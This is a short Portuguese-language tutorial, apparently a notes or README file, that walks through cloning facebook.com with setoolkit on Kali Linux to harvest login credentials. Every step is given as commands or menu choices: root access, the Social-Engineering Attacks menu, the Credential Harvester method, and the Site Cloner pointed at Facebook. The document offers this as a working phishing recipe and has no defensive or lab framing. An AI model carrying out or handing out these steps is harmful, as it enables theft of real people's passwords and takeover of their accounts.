# Phishing para Captura de Senhas do Facebook

## Ferramentas Necessárias

- **Kali Linux**
- **setoolkit**

## Configurando o Phishing no Kali Linux

```bash
# Acesse como root
sudo su

# Inicie o setoolkit
setoolkit

# Escolha o tipo de ataque
# > Social-Engineering Attacks

# Escolha o vetor de ataque
# > Web Site Attack Vectors

# Selecione o método de ataque
# > Credential Harvester Attack Method

# Selecione o método
# > Site Cloner

# Obtenha o endereço IP da sua máquina
ifconfig

# Insira a URL que será clonada
# > http://www.facebook.com